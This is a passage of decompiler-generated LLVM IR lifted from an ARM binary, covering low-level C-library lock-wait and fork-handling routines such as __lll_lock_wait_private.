dec_label_pc_10914:                               ; preds = %dec_label_pc_108e4, %dec_label_pc_108fc.dec_label_pc_108f0_crit_edge, %dec_label_pc_10910
  %v0_10914 = phi i32 [ %v0_10910, %dec_label_pc_10910 ], [ %v2_108f0113, %dec_label_pc_108e4 ], [ %v2_108f0, %dec_label_pc_108fc.dec_label_pc_108f0_crit_edge ]
  %v1_10914 = phi i32 [ %v0_10910, %dec_label_pc_10910 ], [ 0, %dec_label_pc_108e4 ], [ %v1_108f4.pre, %dec_label_pc_108fc.dec_label_pc_108f0_crit_edge ]
  %v3_10914 = icmp uge i32 %v0_10914, %v1_10914
  store i1 %v3_10914, i1* %cpsr_c.global-to-local, align 1
  %v9_10914 = icmp eq i32 %v0_10914, %v1_10914
  br i1 %v9_10914, label %bb74, label %bb73

bb73:                                             ; preds = %dec_label_pc_10914
  %v1_10918 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_10918, i32* %r0.global-to-local, align 4
  br label %bb74

bb74:                                             ; preds = %dec_label_pc_10914, %bb73
  %v1_1091c = xor i1 %v9_10914, true
  call void @__pseudo_cond_branch(i1 %v1_1091c, i32 ptrtoint (i32* @global_var_10b94.194 to i32))
  %v0_10920 = load i32, i32* %r5.global-to-local, align 4
  %v1_10920 = load i32, i32* %r7.global-to-local, align 4
  %v2_10920 = add i32 %v1_10920, 8
  %v3_10920 = inttoptr i32 %v2_10920 to i32*
  store i32 %v0_10920, i32* %v3_10920, align 4
  br label %dec_label_pc_10a44

dec_label_pc_10a44:                               ; preds = %bb74, %dec_label_pc_108c8
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_10928 = load i32, i32* %r8.global-to-local, align 4
  %v2_10928 = add i32 %v0_10928, 160
  %v3_10928 = inttoptr i32 %v2_10928 to i32*
  %v4_10928 = load i32, i32* %v3_10928, align 4
  store i32 %v4_10928, i32* %r2.global-to-local, align 4
  %v1_1092c = add i32 %v4_10928, 4
  %v2_1092c = inttoptr i32 %v1_1092c to i32*
  %v3_1092c = load i32, i32* %v2_1092c, align 4
  %v1_10930 = add i32 %v3_1092c, 1
  store i32 %v1_10930, i32* %r3.global-to-local, align 4
  store i32 %v1_10930, i32* %v2_1092c, align 4
  %v0_10938 = load i32, i32* %r5.global-to-local, align 4
  %v1_10938 = add i32 %v0_10938, 108
  %v2_10938 = inttoptr i32 %v1_10938 to i32*
  %v3_10938 = load i32, i32* %v2_10938, align 4
  store i32 %v3_10938, i32* %sl.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v1_10940 = sub i32 0, %v3_10938
  store i32 %v1_10940, i32* %v2_10938, align 4
  store i32 18874385, i32* %r0.global-to-local, align 4
  %v0_10954 = load i32, i32* %r5.global-to-local, align 4
  %v1_10954 = add i32 %v0_10954, 104
  store i32 %v1_10954, i32* %r4.global-to-local, align 4
  store i32 120, i32* %r7.global-to-local, align 4
  store i32 18874385, i32* %r2.global-to-local, align 4
  store i32 18874385, i32* %sb.global-to-local, align 4
  %v0_10a48.pre = load i32, i32* %sl.global-to-local, align 4
  store i32 160, i32* %r3.global-to-local, align 4
  %v2_10a48 = add i32 %v0_10954, 108
  %v3_10a48 = inttoptr i32 %v2_10a48 to i32*
  store i32 %v0_10a48.pre, i32* %v3_10a48, align 4
  %v0_10a4c = load i32, i32* %r8.global-to-local, align 4
  %v1_10a4c = load i32, i32* %r3.global-to-local, align 4
  %v2_10a4c = add i32 %v1_10a4c, %v0_10a4c
  %v3_10a4c = inttoptr i32 %v2_10a4c to i32*
  %v4_10a4c = load i32, i32* %v3_10a4c, align 4
  store i32 %v4_10a4c, i32* %r0.global-to-local, align 4
  %v1_10a50 = add i32 %v4_10a4c, 4
  %v2_10a50 = inttoptr i32 %v1_10a50 to i32*
  %v3_10a50 = load i32, i32* %v2_10a50, align 4
  %v1_10a54 = add i32 %v3_10a50, -1
  store i32 %v1_10a54, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10a58 = icmp eq i32 %v1_10a54, 0
  store i32 %v1_10a54, i32* %v2_10a50, align 4
  br i1 %v2_10a58, label %dec_label_pc_10a64, label %dec_label_pc_10b54thread-pre-split

dec_label_pc_10a64:                               ; preds = %dec_label_pc_10a44
  %v0_10a64 = load i32, i32* %r3.global-to-local, align 4
  %v1_10a64 = load i32, i32* %r0.global-to-local, align 4
  %v2_10a64 = add i32 %v1_10a64, 8
  %v3_10a64 = inttoptr i32 %v2_10a64 to i32*
  store i32 %v0_10a64, i32* %v3_10a64, align 4
  %v0_10a68 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10a68, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10a6c

dec_label_pc_10a6c:                               ; preds = %dec_label_pc_10a9c.dec_label_pc_10a6c_crit_edge, %dec_label_pc_10a64
  %v0_10a6c = phi i32 [ %v0_10a6c.pre, %dec_label_pc_10a9c.dec_label_pc_10a6c_crit_edge ], [ %v0_10a68, %dec_label_pc_10a64 ]
  %v1_10a6c = inttoptr i32 %v0_10a6c to i32*
  %v2_10a6c = load i32, i32* %v1_10a6c, align 4
  store i32 %v2_10a6c, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_10a6c, i32* %r2.global-to-local, align 4
  %v2_10a78100 = load i32, i32* %v1_10a6c, align 4
  store i32 %v2_10a78100, i32* %r3.global-to-local, align 4
  %v3_10a7c102 = icmp uge i32 %v2_10a78100, %v2_10a6c
  store i1 %v3_10a7c102, i1* %cpsr_c.global-to-local, align 1
  %v9_10a7c108 = icmp eq i32 %v2_10a78100, %v2_10a6c
  br i1 %v9_10a7c108, label %dec_label_pc_10a84, label %dec_label_pc_10a9c

dec_label_pc_10a84:                               ; preds = %dec_label_pc_10a6c, %dec_label_pc_10a84.dec_label_pc_10a78_crit_edge
  %v0_10a84109 = phi i32 [ %v1_10a7c.pre, %dec_label_pc_10a84.dec_label_pc_10a78_crit_edge ], [ %v2_10a6c, %dec_label_pc_10a6c ]
  store i32 %v0_10a84109, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_10a94 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_10a94, label %dec_label_pc_10a98, label %dec_label_pc_10a84.dec_label_pc_10a78_crit_edge

dec_label_pc_10a84.dec_label_pc_10a78_crit_edge:  ; preds = %dec_label_pc_10a84
  %v0_10a78.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_10a7c.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_10a78 = inttoptr i32 %v0_10a78.pre to i32*
  %v2_10a78 = load i32, i32* %v1_10a78, align 4
  store i32 %v2_10a78, i32* %r3.global-to-local, align 4
  %v3_10a7c = icmp uge i32 %v2_10a78, %v1_10a7c.pre
  store i1 %v3_10a7c, i1* %cpsr_c.global-to-local, align 1
  %v9_10a7c = icmp eq i32 %v2_10a78, %v1_10a7c.pre
  br i1 %v9_10a7c, label %dec_label_pc_10a84, label %dec_label_pc_10a9c

dec_label_pc_10a98:                               ; preds = %dec_label_pc_10a84
  %v0_10a98 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_10a98, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10a9c

dec_label_pc_10a9c:                               ; preds = %dec_label_pc_10a6c, %dec_label_pc_10a84.dec_label_pc_10a78_crit_edge, %dec_label_pc_10a98
  %v0_10aa4 = phi i32 [ %v0_10a98, %dec_label_pc_10a98 ], [ %v2_10a78100, %dec_label_pc_10a6c ], [ %v2_10a78, %dec_label_pc_10a84.dec_label_pc_10a78_crit_edge ]
  %v1_10a9c = phi i32 [ %v0_10a98, %dec_label_pc_10a98 ], [ %v2_10a6c, %dec_label_pc_10a6c ], [ %v1_10a7c.pre, %dec_label_pc_10a84.dec_label_pc_10a78_crit_edge ]
  %v3_10a9c = icmp uge i32 %v0_10aa4, %v1_10a9c
  store i1 %v3_10a9c, i1* %cpsr_c.global-to-local, align 1
  %v9_10a9c = icmp eq i32 %v0_10aa4, %v1_10a9c
  br i1 %v9_10a9c, label %dec_label_pc_10aa4, label %dec_label_pc_10a9c.dec_label_pc_10a6c_crit_edge

dec_label_pc_10a9c.dec_label_pc_10a6c_crit_edge:  ; preds = %dec_label_pc_10a9c
  %v0_10a6c.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10a6c

dec_label_pc_10aa4:                               ; preds = %dec_label_pc_10a9c
  %v2_10aa4 = icmp ne i32 %v1_10a9c, 0
  store i1 %v2_10aa4, i1* %cpsr_c.global-to-local, align 1
  %v7_10aa8 = icmp slt i32 %v1_10a9c, 2
  br i1 %v7_10aa8, label %dec_label_pc_10b54thread-pre-split, label %dec_label_pc_10aac

dec_label_pc_10aac:                               ; preds = %dec_label_pc_10aa4
  %v0_10aac = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_10aac, i32* %r0.global-to-local, align 4
  %v0_10ab0 = load i32, i32* %r1.global-to-local, align 4
  %v1_10ab0 = add i32 %v0_10ab0, 129
  store i32 %v1_10ab0, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_10b54thread-pre-split

dec_label_pc_10ac8:                               ; preds = %dec_label_pc_10b54thread-pre-split, %dec_label_pc_10b50
  %v0_10ac8 = phi i32 [ %v3_10b50, %dec_label_pc_10b50 ], [ %v0_10b54.pr, %dec_label_pc_10b54thread-pre-split ]
  %v1_10ac8 = inttoptr i32 %v0_10ac8 to i32*
  %v2_10ac8 = load i32, i32* %v1_10ac8, align 4
  store i32 %v2_10ac8, i32* %r3.global-to-local, align 4
  %v1_10acc = add i32 %v2_10ac8, 8
  %v2_10acc = inttoptr i32 %v1_10acc to i32*
  %v3_10acc = load i32, i32* %v2_10acc, align 4
  store i32 %v3_10acc, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10ad0 = icmp eq i32 %v3_10acc, 0
  br i1 %v2_10ad0, label %bb76, label %bb75

bb75:                                             ; preds = %dec_label_pc_10ac8
  br label %bb76

bb76:                                             ; preds = %dec_label_pc_10ac8, %bb75
  %v2_10ad8 = xor i1 %v2_10ad0, true
  call void @__pseudo_cond_branch(i1 %v2_10ad8, i32 %v3_10acc)
  %v0_10adc = load i32, i32* %r6.global-to-local, align 4
  %v1_10adc = inttoptr i32 %v0_10adc to i32*
  %v2_10adc = load i32, i32* %v1_10adc, align 4
  store i32 %v2_10adc, i32* %r5.global-to-local, align 4
  %v1_10ae0 = add i32 %v2_10adc, 20
  store i32 %v1_10ae0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_10ae4

dec_label_pc_10ae4:                               ; preds = %dec_label_pc_10b18.dec_label_pc_10ae4_crit_edge, %bb76
  %v0_10ae8 = phi i32 [ %v0_10ae8.pre, %dec_label_pc_10b18.dec_label_pc_10ae4_crit_edge ], [ %v1_10ae0, %bb76 ]
  %v0_10ae4 = phi i32 [ %v0_10ae4.pre, %dec_label_pc_10b18.dec_label_pc_10ae4_crit_edge ], [ %v2_10adc, %bb76 ]
  %v1_10ae4 = add i32 %v0_10ae4, 20
  %v2_10ae4 = inttoptr i32 %v1_10ae4 to i32*
  %v3_10ae4 = load i32, i32* %v2_10ae4, align 4
  store i32 %v0_10ae8, i32* %r2.global-to-local, align 4
  store i32 %v3_10ae4, i32* %r4.global-to-local, align 4
  %v1_10af0 = add i32 %v3_10ae4, -1
  store i32 %v1_10af0, i32* %r1.global-to-local, align 4
  %v1_10af487 = inttoptr i32 %v0_10ae8 to i32*
  %v2_10af488 = load i32, i32* %v1_10af487, align 4
  store i32 %v2_10af488, i32* %r3.global-to-local, align 4
  %v3_10af890 = icmp uge i32 %v2_10af488, %v3_10ae4
  store i1 %v3_10af890, i1* %cpsr_c.global-to-local, align 1
  %v9_10af896 = icmp eq i32 %v2_10af488, %v3_10ae4
  br i1 %v9_10af896, label %dec_label_pc_10b00, label %dec_label_pc_10b18

dec_label_pc_10b00:                               ; preds = %dec_label_pc_10ae4, %dec_label_pc_10b00.dec_label_pc_10af4_crit_edge
  %v0_10b0097 = phi i32 [ %v1_10af8.pre, %dec_label_pc_10b00.dec_label_pc_10af4_crit_edge ], [ %v3_10ae4, %dec_label_pc_10ae4 ]
  store i32 %v0_10b0097, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_10b10 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_10b10, label %dec_label_pc_10b14, label %dec_label_pc_10b00.dec_label_pc_10af4_crit_edge

dec_label_pc_10b00.dec_label_pc_10af4_crit_edge:  ; preds = %dec_label_pc_10b00
  %v0_10af4.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_10af8.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_10af4 = inttoptr i32 %v0_10af4.pre to i32*
  %v2_10af4 = load i32, i32* %v1_10af4, align 4
  store i32 %v2_10af4, i32* %r3.global-to-local, align 4
  %v3_10af8 = icmp uge i32 %v2_10af4, %v1_10af8.pre
  store i1 %v3_10af8, i1* %cpsr_c.global-to-local, align 1
  %v9_10af8 = icmp eq i32 %v2_10af4, %v1_10af8.pre
  br i1 %v9_10af8, label %dec_label_pc_10b00, label %dec_label_pc_10b18

dec_label_pc_10b14:                               ; preds = %dec_label_pc_10b00
  %v0_10b14 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_10b14, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10b18

dec_label_pc_10b18:                               ; preds = %dec_label_pc_10ae4, %dec_label_pc_10b00.dec_label_pc_10af4_crit_edge, %dec_label_pc_10b14
  %v0_10b24 = phi i32 [ %v0_10b14, %dec_label_pc_10b14 ], [ %v2_10af488, %dec_label_pc_10ae4 ], [ %v2_10af4, %dec_label_pc_10b00.dec_label_pc_10af4_crit_edge ]
  %v1_10b18 = phi i32 [ %v0_10b14, %dec_label_pc_10b14 ], [ %v3_10ae4, %dec_label_pc_10ae4 ], [ %v1_10af8.pre, %dec_label_pc_10b00.dec_label_pc_10af4_crit_edge ]
  %v3_10b18 = icmp uge i32 %v0_10b24, %v1_10b18
  store i1 %v3_10b18, i1* %cpsr_c.global-to-local, align 1
  %v9_10b18 = icmp eq i32 %v0_10b24, %v1_10b18
  store i32 %v0_10b24, i32* %r2.global-to-local, align 4
  br i1 %v9_10b18, label %dec_label_pc_10b24, label %dec_label_pc_10b18.dec_label_pc_10ae4_crit_edge

dec_label_pc_10b18.dec_label_pc_10ae4_crit_edge:  ; preds = %dec_label_pc_10b18
  %v0_10ae4.pre = load i32, i32* %r5.global-to-local, align 4
  %v0_10ae8.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_10ae4

dec_label_pc_10b24:                               ; preds = %dec_label_pc_10b18
  %v2_10b24 = icmp ne i32 %v1_10b18, 0
  store i1 %v2_10b24, i1* %cpsr_c.global-to-local, align 1
  %v7_10b24 = icmp eq i32 %v1_10b18, 1
  %v0_10b2c = load i32, i32* %r6.global-to-local, align 4
  br i1 %v7_10b24, label %dec_label_pc_10b2c, label %dec_label_pc_10b50

dec_label_pc_10b2c:                               ; preds = %dec_label_pc_10b24
  %v1_10b2c = inttoptr i32 %v0_10b2c to i32*
  %v2_10b2c = load i32, i32* %v1_10b2c, align 4
  store i32 %v2_10b2c, i32* %r1.global-to-local, align 4
  %v1_10b30 = add i32 %v2_10b2c, 24
  %v2_10b30 = inttoptr i32 %v1_10b30 to i32*
  %v3_10b30 = load i32, i32* %v2_10b30, align 4
  store i32 %v3_10b30, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10b34 = icmp eq i32 %v3_10b30, 0
  br i1 %v2_10b34, label %dec_label_pc_10b50, label %dec_label_pc_10b3c

dec_label_pc_10b3c:                               ; preds = %dec_label_pc_10b2c
  %v1_10b3c = add i32 %v2_10b2c, 20
  %v2_10b3c = inttoptr i32 %v1_10b3c to i32*
  %v3_10b3c = load i32, i32* %v2_10b3c, align 4
  store i32 %v3_10b3c, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 129, i32* %r1.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_10b50

dec_label_pc_10b50:                               ; preds = %dec_label_pc_10b24, %dec_label_pc_10b3c, %dec_label_pc_10b2c
  %v1_10b50 = add i32 %v0_10b2c, 4
  %v2_10b50 = inttoptr i32 %v1_10b50 to i32*
  %v3_10b50 = load i32, i32* %v2_10b50, align 4
  store i32 %v3_10b50, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10b54 = icmp eq i32 %v3_10b50, 0
  br i1 %v2_10b54, label %dec_label_pc_10b5c, label %dec_label_pc_10ac8

dec_label_pc_10b54thread-pre-split:               ; preds = %dec_label_pc_10aac, %dec_label_pc_10aa4, %dec_label_pc_10a44
  %v0_10b54.pr = load i32, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10b5411 = icmp eq i32 %v0_10b54.pr, 0
  br i1 %v2_10b5411, label %dec_label_pc_10b5c, label %dec_label_pc_10ac8

dec_label_pc_10b5c:                               ; preds = %dec_label_pc_10b50, %dec_label_pc_10b54thread-pre-split
  %v0_10b5c.pre = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_10b5c.pre, i32* %r0.global-to-local, align 4
  ret i32 %v0_10b5c.pre

; uselistorder directives
  uselistorder i32 %v0_10b54.pr, { 1, 0 }
  uselistorder i32 %v3_10b50, { 1, 2, 0 }
  uselistorder i32 %v1_10b18, { 1, 0, 2, 3 }
  uselistorder i32 %v0_10b14, { 1, 0, 2 }
  uselistorder i32 %v1_10af8.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_10a98, { 1, 0, 2 }
  uselistorder i32 %v1_10a7c.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_10a6c, { 1, 0 }
  uselistorder i32 %v0_10910, { 1, 0, 2 }
  uselistorder i32 %v1_108f4.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v4_108cc, { 2, 1, 0, 3 }
  uselistorder i32 %v0_108a4, { 1, 0, 2 }
  uselistorder i32 %v1_10888.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v2_10850, { 1, 0, 2 }
  uselistorder i32 %v0_10830, { 1, 0, 2 }
  uselistorder i32 %v1_10814.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v3_107f4, { 0, 1, 2, 3, 5, 4, 6, 7 }
  uselistorder i32* %r8.global-to-local, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32* %r7.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 8, 9, 10, 11, 12, 14, 13, 0 }
  uselistorder i32* %r6.global-to-local, { 6, 0, 4, 5, 7, 1, 2, 3 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 16, 15, 17 }
  uselistorder i32* %r3.global-to-local, { 4, 5, 6, 8, 7, 3, 9, 10, 11, 12, 14, 13, 34, 15, 16, 17, 18, 19, 20, 21, 23, 22, 1, 24, 25, 26, 28, 27, 2, 29, 30, 32, 31, 0, 33 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 13, 11, 12 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 8, 3, 4, 5, 6, 25, 26, 7, 9, 10, 11, 31, 32, 12, 13, 15, 14, 0, 16, 17, 18, 27, 28, 19, 20, 21, 22, 29, 30, 24, 23, 2 }
  uselistorder label %dec_label_pc_10b5c, { 1, 0 }
  uselistorder label %dec_label_pc_10b50, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10b18, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10b00, { 1, 0 }
  uselistorder label %bb76, { 1, 0 }
  uselistorder label %dec_label_pc_10a9c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10a84, { 1, 0 }
  uselistorder label %bb74, { 1, 0 }
  uselistorder label %dec_label_pc_10914, { 2, 1, 0 }
  uselistorder label %dec_label_pc_108fc, { 1, 0 }
  uselistorder label %dec_label_pc_108a8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10890, { 1, 0 }
  uselistorder label %bb72, { 1, 0 }
  uselistorder label %dec_label_pc_10834, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1081c, { 1, 0 }
  uselistorder label %dec_label_pc_108b8.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_107e8, { 1, 0 }
}

define i32 @__lll_lock_wait_private(i32* %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_10b94 = load i32, i32* @r4, align 4
  store i32 %v3_10b94, i32* %stack_var_-16, align 4
  %v0_10b98 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10b98, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10b9c

dec_label_pc_10b9c:                               ; preds = %dec_label_pc_10c1c.dec_label_pc_10b9c_crit_edge, %entry
  %v0_10ba0 = phi i32 [ %v0_10ba0.pre, %dec_label_pc_10c1c.dec_label_pc_10b9c_crit_edge ], [ %v0_10b98, %entry ]
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 %v0_10ba0, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r4.global-to-local, align 4
  %v1_10ba817 = inttoptr i32 %v0_10ba0 to i32*
  %v2_10ba818 = load i32, i32* %v1_10ba817, align 4
  %v3_10bac20 = icmp ne i32 %v2_10ba818, 0
  store i1 %v3_10bac20, i1* %cpsr_c.global-to-local, align 1
  %v9_10bac26 = icmp eq i32 %v2_10ba818, 1
  br i1 %v9_10bac26, label %dec_label_pc_10bb4, label %dec_label_pc_10bcc

dec_label_pc_10bb4:                               ; preds = %dec_label_pc_10b9c, %dec_label_pc_10bb4.dec_label_pc_10ba8_crit_edge
  %v0_10bb427 = phi i32 [ %v1_10bac.pre, %dec_label_pc_10bb4.dec_label_pc_10ba8_crit_edge ], [ 1, %dec_label_pc_10b9c ]
  store i32 %v0_10bb427, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_10bc4 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_10bc4, label %dec_label_pc_10bc8, label %dec_label_pc_10bb4.dec_label_pc_10ba8_crit_edge

dec_label_pc_10bb4.dec_label_pc_10ba8_crit_edge:  ; preds = %dec_label_pc_10bb4
  %v0_10ba8.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_10bac.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_10ba8 = inttoptr i32 %v0_10ba8.pre to i32*
  %v2_10ba8 = load i32, i32* %v1_10ba8, align 4
  %v3_10bac = icmp uge i32 %v2_10ba8, %v1_10bac.pre
  store i1 %v3_10bac, i1* %cpsr_c.global-to-local, align 1
  %v9_10bac = icmp eq i32 %v2_10ba8, %v1_10bac.pre
  br i1 %v9_10bac, label %dec_label_pc_10bb4, label %dec_label_pc_10bcc

dec_label_pc_10bc8:                               ; preds = %dec_label_pc_10bb4
  %v0_10bc8 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10bcc

dec_label_pc_10bcc:                               ; preds = %dec_label_pc_10b9c, %dec_label_pc_10bb4.dec_label_pc_10ba8_crit_edge, %dec_label_pc_10bc8
  %v0_10bcc = phi i32 [ %v0_10bc8, %dec_label_pc_10bc8 ], [ %v2_10ba818, %dec_label_pc_10b9c ], [ %v2_10ba8, %dec_label_pc_10bb4.dec_label_pc_10ba8_crit_edge ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10bcc = icmp eq i32 %v0_10bcc, 0
  %v0_10bf0.pre = load i32, i32* %r5.global-to-local, align 4
  br i1 %v2_10bcc, label %dec_label_pc_10bec, label %dec_label_pc_10bd4

dec_label_pc_10bd4:                               ; preds = %dec_label_pc_10bcc
  store i32 %v0_10bf0.pre, i32* %r0.global-to-local, align 4
  %v0_10bd8 = load i32, i32* %r1.global-to-local, align 4
  %v1_10bd8 = add i32 %v0_10bd8, 126
  store i32 %v1_10bd8, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10bec

dec_label_pc_10bec:                               ; preds = %dec_label_pc_10bcc, %dec_label_pc_10bd4
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 %v0_10bf0.pre, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_10bf828 = inttoptr i32 %v0_10bf0.pre to i32*
  %v2_10bf829 = load i32, i32* %v1_10bf828, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_10bfc36 = icmp eq i32 %v2_10bf829, 0
  br i1 %v9_10bfc36, label %dec_label_pc_10c04, label %dec_label_pc_10c1c

dec_label_pc_10c04:                               ; preds = %dec_label_pc_10bec, %dec_label_pc_10c04.dec_label_pc_10bf8_crit_edge
  %v0_10c0437 = phi i32 [ %v1_10bfc.pre, %dec_label_pc_10c04.dec_label_pc_10bf8_crit_edge ], [ 0, %dec_label_pc_10bec ]
  store i32 %v0_10c0437, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_10c14 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_10c14, label %dec_label_pc_10c18, label %dec_label_pc_10c04.dec_label_pc_10bf8_crit_edge

dec_label_pc_10c04.dec_label_pc_10bf8_crit_edge:  ; preds = %dec_label_pc_10c04
  %v0_10bf8.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_10bfc.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_10bf8 = inttoptr i32 %v0_10bf8.pre to i32*
  %v2_10bf8 = load i32, i32* %v1_10bf8, align 4
  %v3_10bfc = icmp uge i32 %v2_10bf8, %v1_10bfc.pre
  store i1 %v3_10bfc, i1* %cpsr_c.global-to-local, align 1
  %v9_10bfc = icmp eq i32 %v2_10bf8, %v1_10bfc.pre
  br i1 %v9_10bfc, label %dec_label_pc_10c04, label %dec_label_pc_10c1c

dec_label_pc_10c18:                               ; preds = %dec_label_pc_10c04
  %v0_10c18 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10c1c

dec_label_pc_10c1c:                               ; preds = %dec_label_pc_10bec, %dec_label_pc_10c04.dec_label_pc_10bf8_crit_edge, %dec_label_pc_10c18
  %v0_10c1c = phi i32 [ %v0_10c18, %dec_label_pc_10c18 ], [ %v2_10bf829, %dec_label_pc_10bec ], [ %v2_10bf8, %dec_label_pc_10c04.dec_label_pc_10bf8_crit_edge ]
  %v1_10c1c = phi i32 [ %v0_10c18, %dec_label_pc_10c18 ], [ 0, %dec_label_pc_10bec ], [ %v1_10bfc.pre, %dec_label_pc_10c04.dec_label_pc_10bf8_crit_edge ]
  %v3_10c1c = icmp uge i32 %v0_10c1c, %v1_10c1c
  store i1 %v3_10c1c, i1* %cpsr_c.global-to-local, align 1
  %v9_10c1c = icmp eq i32 %v0_10c1c, %v1_10c1c
  br i1 %v9_10c1c, label %dec_label_pc_10c24, label %dec_label_pc_10c1c.dec_label_pc_10b9c_crit_edge

dec_label_pc_10c1c.dec_label_pc_10b9c_crit_edge:  ; preds = %dec_label_pc_10c1c
  %v0_10ba0.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10b9c

dec_label_pc_10c24:                               ; preds = %dec_label_pc_10c1c
  %v2_10c24 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_10c24, i32* %r4.global-to-local, align 4
  %v1_10c28 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_10c28

; uselistorder directives
  uselistorder i32 %v0_10c18, { 1, 0 }
  uselistorder i32 %v1_10bfc.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_10bac.pre, { 2, 1, 0 }
  uselistorder i32 %v2_10ba818, { 0, 2, 1 }
  uselistorder i32* %r5.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 1, 3, 5, 4, 6 }
  uselistorder i32* %r0.global-to-local, { 4, 2, 3, 5, 0, 1 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 6, 7, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_10c1c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10c04, { 1, 0 }
  uselistorder label %dec_label_pc_10bec, { 1, 0 }
  uselistorder label %dec_label_pc_10bcc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10bb4, { 1, 0 }
}

define i32 @__linkin_atfork(i32* %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
